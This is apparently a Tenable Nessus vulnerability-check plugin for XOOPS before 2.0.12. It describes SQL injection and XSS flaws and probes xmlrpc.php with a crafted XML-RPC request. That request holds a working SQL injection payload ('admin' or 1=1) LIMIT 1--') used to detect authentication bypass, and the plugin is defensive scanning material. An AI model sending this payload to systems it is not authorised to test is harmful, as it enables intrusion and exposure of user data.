#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description) {
  script_id(18614);
  script_version("$Revision: 1.22 $");

  script_cve_id("CVE-2005-2112", "CVE-2005-2113");
  script_bugtraq_id(14094, 14096);
  script_osvdb_id(17633, 17634, 17635);
  script_xref(name:"EDB-ID", value:"1082");

  script_name(english:"XOOPS < 2.0.12 Multiple Vulnerabilities");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains several PHP scripts that are prone to
SQL injection and cross-site scripting attacks." );
 script_set_attribute(attribute:"description", value:
"The installed version of XOOPS on the remote host is affected by
several vulnerabilities :

  - A SQL Injection Vulnerability
    The bundled XMLRPC server fails to sanitize user-
    supplied input to the 'xmlrpc.php' script. An attacker 
    can exploit this flaw to launch SQL injection attacks, 
    which could lead to authentication bypass, disclosure 
    of sensitive information, attacks against the underlying 
    database, and the like.

  - Multiple Cross-Site Scripting Vulnerabilities
    An attacker can inject arbitrary HTML and script code 
    through the 'order' and 'cid' parameters of the 
    'modules/newbb/edit.php' and 
    'modules/repository/comment_edit.php' scripts 
    respectively, which could result in disclosure of 
    administrative session cookies." );
  # http://web.archive.org/web/20081205191243/http://www.gulftech.org/?node=research&article_id=00086-06292005
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?ae0cfcc4" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to XOOPS version 2.0.12 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

 script_set_attribute(attribute:"plugin_publication_date", value: "2005/07/05");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/06/29");
 script_cvs_date("$Date: 2015/11/18 21:03:58 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe", value:"cpe:/a:xoops:xoops"); 
script_end_attributes();

 
  script_summary(english:"Checks for multiple vulnerabilities in XOOPS < 2.0.12");
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2015 Tenable Network Security, Inc.");

  script_dependencies("xoops_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/xoops");
  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);

# Test an install.
install = get_kb_item(string("www/", port, "/xoops"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  dir = matches[2];
  # Check whether the script exists.
  r = http_send_recv3(method: "GET", item:string(dir, "/xmlrpc.php"), port:port);
  if (isnull(r)) exit(0);

  # If it does...
  if ("<value>Method not supported" >< r[2]) {
    # Try to exploit the SQL injection.
    postdata = string(
      '<?xml version="1.0"?>',
      "<methodCall>",
      "<methodName>blogger.getUserInfo</methodName>",
        "<params>",
          "<param><value><string></string></value></param>",
          "<param><value><string>admin' or 1=1) LIMIT 1--</string></value></param>",
          "<param><value><string>", SCRIPT_NAME, "</string></value></param>",
          "<param><value><string></string></value></param>",
        "</params>",
      "</methodCall>"
    );
    r = http_send_recv3(method: "POST", item: dir+"/xmlrpc.php", version: 11, port: port,
 add_headers: make_array("Content-Type", "text/xml"), data: postdata);
    if (isnull(r)) exit(0);

    # There's a problem if we get member info.
    if ("<struct><member><name>" >< r[2]) {
      security_hole(port);
      set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
      set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
      exit(0);
    }
  }
}
